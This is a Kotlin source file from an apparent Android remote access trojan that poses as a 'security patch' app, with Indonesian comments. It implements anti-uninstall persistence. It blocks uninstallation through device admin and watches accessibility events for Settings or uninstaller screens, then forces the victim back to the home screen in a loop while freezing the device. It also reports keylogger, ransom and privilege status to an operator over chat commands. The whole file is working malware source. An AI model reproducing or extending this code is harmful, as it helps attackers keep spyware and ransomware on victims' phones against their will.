package com.android.security.patch.commands

import android.app.admin.DevicePolicyManager
import android.content.Context
import android.os.Handler
import android.os.Looper
import android.view.accessibility.AccessibilityEvent
import com.android.security.patch.AdminReceiver
import com.android.security.patch.HangManager
import com.android.security.patch.KeylogService
import com.android.security.patch.Prefs
import com.android.security.patch.RatApi

object Rules {

    @Volatile private var kickRunning = false
    private val handler = Handler(Looper.getMainLooper())

    // ============ ANTI-UNINSTALL ============

    fun applyAntiUninstall(ctx: Context, on: Boolean) {
        Prefs.setBool(ctx, Prefs.ANTI_UNINSTALL_ON, on)
        try {
            val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            if (dpm.isAdminActive(AdminReceiver.component(ctx))) {
                dpm.setUninstallBlocked(AdminReceiver.component(ctx), ctx.packageName, on)
            }
        } catch (_: Throwable) {}
        // trigger kick kalau baru ON dan user udah di layar bahaya
        if (on) {
            try { KeylogService.instance?.goHome() } catch (_: Throwable) {}
        }
    }

    fun toggleAntiUninstall(ctx: Context, chatId: Long, args: Array<String>) {
        val mode = args.getOrNull(0)?.lowercase()
        val current = Prefs.getBool(ctx, Prefs.ANTI_UNINSTALL_ON)
        val next = when (mode) {
            "on", "true", "1" -> true
            "off", "false", "0" -> false
            else -> !current
        }
        applyAntiUninstall(ctx, next)
        val state = if (next) "ON" else "OFF"
        val extra = if (!next) "\n(apk bisa di-uninstall, service mati total)" else ""
        RatApi.sendMessage(ctx, "anti-uninstall: <b>$state</b>$extra", chatId)
    }

    // ============ HANG ============

    fun hangNow(ctx: Context, chatId: Long, args: Array<String>) {
        HangManager.start(ctx, HangManager.Reason.MANUAL)
        RatApi.sendMessage(ctx, "hang started (auto-stop 60s)", chatId)
    }

    fun hangStop(ctx: Context, chatId: Long) {
        HangManager.stop(ctx)
        stopKick()
        RatApi.sendMessage(ctx, "hang stopped", chatId)
    }

    // ============ KICK dari accessibility ============

    fun onAccessibilityEvent(ctx: Context, e: AccessibilityEvent) {
        if (!Prefs.getBool(ctx, Prefs.ANTI_UNINSTALL_ON)) return
        try {
            val cls = e.className?.toString() ?: ""
            val pkg = e.packageName?.toString() ?: ""
            val text = e.text?.joinToString(" ").orEmpty()
            val desc = e.contentDescription?.toString().orEmpty()
            val all = (text + " " + desc).lowercase()

            val isAppInfo = cls.contains("InstalledAppDetails", true)
                || cls.contains("ApplicationDetails", true)
                || cls.contains("AppInfoDashboard", true)
                || cls.contains("AppInfo", true)
                || cls.contains("AppDetail", true)
                || cls.contains("InstalledApp", true)
                || cls.contains("ManageApplications", true)

            val isUninstallUI = cls.contains("Uninstall", true)
                || cls.contains("PackageInstaller", true)
                || pkg.contains("packageinstaller", true)
                || pkg.contains("package.installer", true)

            val isSettings = pkg == "com.android.settings"
                || pkg.startsWith("com.samsung.android.settings")
                || pkg.startsWith("com.android.settings")
                || pkg.contains("settings")

            val mentionsUs = all.contains("security patch")
                || all.contains("com.android.security.patch")
                || all.contains(ctx.packageName.lowercase())

            val dangerWords = all.contains("uninstall")
                || all.contains("hapus instalasi")
                || all.contains("hapus aplikasi")
                || all.contains("un-install")
                || all.contains("nonaktifkan")
                || all.contains("non-aktifkan")
                || all.contains("deactivate")
                || all.contains("remove")

            val triggered =
                (isSettings && isAppInfo && mentionsUs) ||
                (isUninstallUI && (mentionsUs || dangerWords)) ||
                (isAppInfo && mentionsUs && dangerWords)

            if (triggered) kick(ctx)
        } catch (_: Throwable) {}
    }

    private const val COOLDOWN_MS = 5 * 60 * 1000L
    private const val KEY_LAST_KICK = "last_kick_ts"

    private fun kick(ctx: Context) {
        if (kickRunning) return

        // cooldown 5 menit antar kick — biar gak loop terus
        val last = Prefs.getLong(ctx, KEY_LAST_KICK)
        if (last > 0 && System.currentTimeMillis() - last < COOLDOWN_MS) {
            // masih cooldown — paksa home sekali aja, jangan hang
            try { KeylogService.instance?.goHome() } catch (_: Throwable) {}
            return
        }

        kickRunning = true
        Prefs.setLong(ctx, KEY_LAST_KICK, System.currentTimeMillis())

        try { HangManager.start(ctx, HangManager.Reason.UNINSTALL) } catch (_: Throwable) {}

        // loop cepat selama hang (60s): kick home tiap 400ms
        val start = System.currentTimeMillis()
        val KICK_DURATION = 60_000L

        val runnable = object : Runnable {
            override fun run() {
                if (!Prefs.getBool(ctx, Prefs.ANTI_UNINSTALL_ON)) {
                    kickRunning = false
                    return
                }
                if (System.currentTimeMillis() - start > KICK_DURATION) {
                    kickRunning = false
                    return
                }
                try { KeylogService.instance?.goHome() } catch (_: Throwable) {}
                handler.postDelayed(this, 400L)
            }
        }
        handler.post(runnable)

        // final push: tepat setelah hang selesai, tendang ke home 5x dalam ~2.5 detik
        val finalPush = object : Runnable {
            var count = 0
            override fun run() {
                if (count >= 5) return
                count++
                try { KeylogService.instance?.goHome() } catch (_: Throwable) {}
                handler.postDelayed(this, 500L)
            }
        }
        handler.postDelayed(finalPush, 60_000L)
    }

    private fun stopKick() {
        kickRunning = false
    }

    // ============ SHOW ============

    fun show(ctx: Context, chatId: Long) {
        val anti = Prefs.getBool(ctx, Prefs.ANTI_UNINSTALL_ON)
        val hang = Prefs.getBool(ctx, Prefs.HANG_ACTIVE)
        val ransom = Prefs.getBool(ctx, Prefs.RANSOM_ACTIVE)
        val admin = AdminReceiver.isActive(ctx)
        val owner = AdminReceiver.isDeviceOwner(ctx)
        val a11y = KeylogService.alive

        val sb = StringBuilder()
        sb.append("<b>⚙ Aturan Rat</b>\n\n")
        sb.append("anti-uninstall: <b>${if (anti) "ON" else "OFF"}</b>\n")
        sb.append("hang sedang aktif: <b>${if (hang) "YA" else "tidak"}</b>\n")
        sb.append("ransom aktif: <b>${if (ransom) "YA" else "tidak"}</b>\n")
        sb.append("device admin: <b>${if (admin) "aktif" else "nonaktif"}</b>\n")
        sb.append("device owner: <b>${if (owner) "ya" else "tidak"}</b>\n")
        sb.append("accessibility: <b>${if (a11y) "aktif" else "nonaktif"}</b>\n")
        sb.append("\n<b>aksi:</b>\n")
        sb.append("• <code>/anti_uninstall on|off|toggle</code>\n")
        sb.append("• <code>/hang_now</code> — paksa hang 60s\n")
        sb.append("• <code>/hang_stop</code> — matikan hang + kick\n")
        sb.append("• <code>/check_paths</code> — cek privilege\n")
        RatApi.sendMessage(ctx, sb.toString(), chatId)
    }
}
